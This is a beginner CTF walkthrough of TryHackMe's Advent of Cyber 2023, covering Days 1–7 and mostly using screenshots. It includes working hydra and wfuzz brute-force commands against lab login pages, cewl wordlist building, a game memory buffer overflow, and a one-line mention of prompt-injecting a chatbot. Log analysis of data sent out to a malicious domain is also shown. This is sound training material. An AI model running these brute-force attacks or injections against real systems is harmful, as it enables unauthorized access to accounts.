# [Advent of Cyber 5 [2023]](https://tryhackme.com/room/adventofcyber2023)

> Get started with Cyber Security in 24 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 1: Chatbot, tell me, if you're really safe?

use some tricky question to inject the prompt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/22a1a05a-dba6-46af-bd35-240f9a448b0c)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eb2fb2a0-9b35-4047-ba20-2b4f07e19faf)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8a64872c-36cd-4aef-9be4-a58119889650)

## Day 2: O Data, All Ye Faithful

start the machine, you will see a browser of jupiter notebook and the instruction on that

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e9940e00-769a-4e55-a072-0d21f92a4efc)

click on notebook `4_Capstone` we have a datasheet network_traffic.csv and a workbook, open it

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3e3d2fd4-d920-4a3e-b060-65d69e04a5b2)

question 2

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bc62e3e1-af24-46cc-896f-74bd11cd6758)

question 3

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ee1a1853-6439-4389-88c2-33d1d6cf00d4)

question 4

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c8c15eae-a62c-4e7e-9e8e-d10719f680b2)

if you got error 'df' not found, so click on "restart the kernel and run all cells"

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/dfff452a-234b-4fd8-9758-07c90951ef46)

## Day 3: Hydra is Coming to Town

start the machine and access it on port 8000

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/17e6c66d-fe82-4005-8a46-26364f2d4ae7)

view source code, i see it post the pin to login.php or you can catch the request with burpsuite

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eda3942b-76ce-44ce-b0b6-bc1cbdfae732)

generate the wordlist

```
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

crack the pass with hydra

```
hydra -l '' -P 3digits.txt -f 10.10.125.189 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a9fcf49c-e97b-44a0-966c-12cb80f6ba6b)

enter the pin

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1dffafc4-68b0-47bc-ac3a-b7653f281989)

here you go

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/07b31e88-e14b-4709-b689-7eab2adc7417)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f77ccd4b-f02f-4711-873b-95e79c952e06)

## Day 4: Baby, it's CeWLd outside

check the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e6794c64-bd0d-4dc2-b29c-560ab0f1d4c7)

use the homepage to generate a wordlist that could potentially hold the key to the portal

```
cewl -d 2 -m 5 -w passwords.txt http://10.10.84.220 --with-numbers
```

use the Team Members page to generate a wordlist that could potentially contain the usernames of the employees

```
cewl -d 0 -m 5 -w usernames.txt http://10.10.84.220/team.php --lowercase
```

bruteforce the login portal using wfuzz

```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.84.220/login.php -d "username=FUZZ&password=FUZ2Z"
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c94d347f-4630-4812-9f0c-96510ba00dea)

log in to the portal using that credential

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/38b4ddc3-a587-4a85-83f0-b6d4272b948b)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ed53c118-900c-4232-8bce-d5a34359bebc)

## Day 5: A Christmas DOScovery: Tapes of Yule-tide Past

start the machine, open the DosBox-X on the Desktop

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/53e63402-c9ee-4e22-b105-4bd30e37112e)

list the directory

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5d69a474-53ec-4114-b553-70e09efa57e7)

navigate to backup tools folder to inspect the backup file

```
cd C:\TOOLS\BACKUP
BUMASTER.EXE C:\AC2023.BAK
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/eead6f3f-10cb-4afd-a3c1-174659f50d06)

check the troubleshoot at readme.txt

```
edit README.TXT
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4f6939fd-745f-4c89-bbcb-59e6bee919c1)

Alt+F and navigate to Exit to exit the editor

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5380b283-d24f-4641-960d-227a1a38356a)

edit the magic byte on the backup file

```
edit C:\AC2023.BAK
```

according previous troubleshoot, the magic bytes must be 41 43. these are hexadecimal values, so we need to convert them to ASCII first

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cdd8f019-9373-4bb3-86c7-10d10a28db18)

change first 2 magic bytes to `AC` and Alt+F to Save the file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/47518a90-2ed9-42ba-90e4-a019a4e8569a)

restore the backup again

```
BUMASTER.EXE C:\AC2023.BAK
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4affd6b0-02e6-4451-a988-8a636168f5c5)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0a9e1f14-0964-40d9-a67f-bd1ed643a751)

## Day 6: Memories of Christmas Past

if the coins variable had the in-memory value in the image below, how many coins would you have in the game?

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/52235c3f-ae87-4b24-a79d-b0f1f2db1c45)

reverse the hex values and convert it to decimal

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c70ee8c4-a62b-4f01-a28e-a60f4e821a73)

go to the game

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ad028d43-b7b8-43ad-b12f-053862feaaa3)

you will need to go out and in the pc to get coin more then 12

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a47eaeeb-1ad4-4f64-99f8-0057d7b504ee)

go to the goblin and change a long name

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b0e98797-bd0b-44b5-aaae-e5d7d1616c62)

we have lots of money, go to van frosty and buy the star

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/be7736e5-6de1-45f0-8532-1b5ea3f07ea6)

but we can buy the star, the game make it unwinable

so, change our name to buffer overflow all the game memory (total 60 characters) and fill all shop item values for int_item

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9e17a843-e7da-438e-83e7-0c0d398c6274)

after that, we have all values from 1-d in our iventory (remember it's lowercase)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/58952b83-5de7-4e9e-b234-7acf6eb1b9b2)

and go to the chrismas tree to get our flag

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2613b0bd-3966-4ad2-a1c9-a276f6146f19)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/293c141f-60d0-413d-9b67-f80da293e6a1)

## Day 7: Tis the season for log chopping!

start the machine, in the artefact on Desktop you can see an access.log file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/aefa19ad-2e8b-4d41-83da-699bfc4c37f1)

check the unique IP addresses are connected to the proxy server

```
cut -d ' ' -f2 access.log | sort | uniq | wc -l
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b7f4bfc4-6b7d-45ea-b609-bfc4d95e9718)

check the unique domains were accessed by all workstations

```
cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq | wc -l
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f755955e-e62f-408e-abc4-a2164310a329)

check the least accessed domain

```
cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq -c | sort
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7ad95ef5-ba81-46ee-a7e3-46f0d0ef63e9)

so, status code is generated by the HTTP requests to the least accessed domain

```
grep partnerservices.getmicrosoftkey.com access.log | cut -d ' ' -f6 | uniq
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/cc385c46-3b6c-4684-98e1-7cd0694e10fc)

check the high count of connection attempts

```
cut -d ' ' -f3 access.log | cut -d ':' -f1 | sort | uniq -c | sort -r
```

it seem a suspicious domain `frostlings.bigbadstash.thm`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c187d929-18d5-47c4-bec6-c6f202fb32c2)

check the source IP of the workstation that accessed the malicious domain

```
grep frostlings.bigbadstash.thm access.log | cut -d ' ' -f2 | uniq
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d6f61819-2e7d-43dc-ac61-085d8d621752)

check the total of requests by the malicious domain

```
grep frostlings.bigbadstash.thm access.log | wc -l
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ad336100-a829-49cf-86a2-5ca7ae350122)

look the format of the log file entries again

```
grep frostlings.bigbadstash.thm access.log | head
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fc9ce283-562c-4bad-8127-dc8f179790da)

it seem a hidden encoded message in each goodies parameters

```
grep frostlings.bigbadstash.thm access.log | cut -d '=' -f2 | cut -d ' ' -f1 | head
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2fee4af6-27df-4fc4-b5c9-5229d79ee05e)

now, decode it from base64 to reveal hidden information

```
grep frostlings.bigbadstash.thm access.log | cut -d '=' -f2 | cut -d ' ' -f1 | base64 -d | head
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9f33a04c-fe7c-457b-bcfd-3b8e789a578d)

grep our flag

```
grep frostlings.bigbadstash.thm access.log | cut -d '=' -f2 | cut -d ' ' -f1 | base64 -d | grep THM
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9a7e8fd0-9352-489d-937a-512902a5a77f)

Answer:

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/088243bb-dd3f-4f79-ba5a-fcf4c6f5221c)

## Day 8: Have a Holly, Jolly Byte!
























